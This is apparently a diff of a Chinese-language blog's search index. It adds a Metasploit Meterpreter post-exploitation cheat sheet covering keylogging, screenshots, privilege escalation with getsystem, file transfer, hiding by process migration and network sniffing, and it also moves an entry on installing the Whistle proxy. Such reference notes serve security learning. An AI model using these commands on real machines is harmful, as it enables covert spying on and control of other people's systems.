+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
 <li><a href="https://www.metasploit.com/">metasploit</a></li>
@@ -979,32 +990,6 @@ db.create_all() -->
       <tags>
         <tag>Security</tag>
         <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安裝 Whistle</title>
-    <url>/2023/01/20/WhistleProxyInstall/</url>
-    <content><![CDATA[<h1 id="使用-Node-安裝-Whistle"><a class="header-anchor" href="#使用-Node-安裝-Whistle"></a>使用 Node 安裝 Whistle</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i -g whistle</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="啟動-Whistle"><a class="header-anchor" href="#啟動-Whistle"></a>啟動 Whistle</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 start</span><br></pre></td></tr></table></figure>
-<h1 id="查看-Whistle-狀態"><a class="header-anchor" href="#查看-Whistle-狀態"></a>查看 Whistle 狀態</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 status</span><br></pre></td></tr></table></figure>
-<h1 id="停止-Whistle"><a class="header-anchor" href="#停止-Whistle"></a>停止 Whistle</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 stop</span><br></pre></td></tr></table></figure>
-<h1 id="設定-Whistle-為-Proxy-的-Server"><a class="header-anchor" href="#設定-Whistle-為-Proxy-的-Server"></a>設定 Whistle 為 Proxy 的 Server</h1>
-<p><img src="Win10ProxySetting.png" alt="Win10ProxySetting"></p>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.npmjs.com/package/whistle">whistle npm</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Whistle</category>
-      </categories>
-      <tags>
-        <tag>Whistle</tag>
       </tags>
   </entry>
   <entry>
@@ -1063,6 +1048,32 @@ db.create_all() -->
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
 <li><a href="https://wproxy.org/whistle/">whistle</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Whistle</category>
+      </categories>
+      <tags>
+        <tag>Whistle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安裝 Whistle</title>
+    <url>/2023/01/20/WhistleProxyInstall/</url>
+    <content><![CDATA[<h1 id="使用-Node-安裝-Whistle"><a class="header-anchor" href="#使用-Node-安裝-Whistle"></a>使用 Node 安裝 Whistle</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i -g whistle</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="啟動-Whistle"><a class="header-anchor" href="#啟動-Whistle"></a>啟動 Whistle</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 start</span><br></pre></td></tr></table></figure>
+<h1 id="查看-Whistle-狀態"><a class="header-anchor" href="#查看-Whistle-狀態"></a>查看 Whistle 狀態</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 status</span><br></pre></td></tr></table></figure>
+<h1 id="停止-Whistle"><a class="header-anchor" href="#停止-Whistle"></a>停止 Whistle</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 stop</span><br></pre></td></tr></table></figure>
+<h1 id="設定-Whistle-為-Proxy-的-Server"><a class="header-anchor" href="#設定-Whistle-為-Proxy-的-Server"></a>設定 Whistle 為 Proxy 的 Server</h1>
+<p><img src="Win10ProxySetting.png" alt="Win10ProxySetting"></p>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.npmjs.com/package/whistle">whistle npm</a></li>
 </ol>
 </div>]]></content>
       <categories>
